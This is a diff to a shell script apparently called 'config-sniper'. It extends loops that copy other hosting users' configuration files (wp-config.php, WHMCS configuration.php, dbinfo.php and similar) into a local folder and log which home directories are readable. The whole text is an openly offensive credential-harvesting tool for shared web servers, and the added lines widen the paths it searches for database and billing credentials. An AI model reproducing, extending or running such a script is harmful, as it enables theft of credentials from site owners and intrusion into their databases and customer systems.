@@ -192,6 +192,16 @@ cp /var/www/html/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.
 cp /var/www/html/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
 cp /var/www/html/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
 cp /var/www/html/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/config.php $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/include/config.php $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/wp-config.php $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/whm/WHMCS/configuration.php $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/whm/configuration.php $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
+cp /home/sites/$i/public_html/configuration.php $pwd/config-sniper/$i.txt
+cp /home/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
+cp /var/www/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
+cp /home1/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
 ls -la /home/$i/public_html/
 
 [ -r "/home/$i/public_html" ] && echo "/home/$i/public_html/" >> open-dir.txt
@@ -201,6 +211,7 @@ ls -la /home/$i/public_html/
 [ -r "/home3/www/$i/public_html/" ] && echo "/home3/$i/public_html/" >> open-dir.txt
 [ -r "/home4/$i/public_html/" ] && echo "/home4/$i/public_html/" >> open-dir.txt
 [ -r "/home5/$i/public_html/" ] && echo "/home5/$i/public_html/" >> open-dir.txt
+[ -r "/home/sites/$i/public_html/" ] && echo "/home/sites/$i/public_html/" >> open-dir.txt
 [ -r "/var/www/html/$i/public_html/" ] && echo "/var/www/html/$i/public_html/" >> open-dir.txt
 
 done
